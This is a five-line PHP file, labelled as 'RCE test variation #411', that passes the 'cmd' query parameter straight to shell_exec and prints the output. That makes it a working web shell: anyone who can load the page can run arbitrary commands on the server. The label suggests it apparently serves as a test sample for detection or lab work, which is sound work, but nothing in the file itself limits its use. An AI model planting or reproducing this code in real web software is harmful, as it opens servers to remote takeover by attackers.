<?php
// RCE test variation #411
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>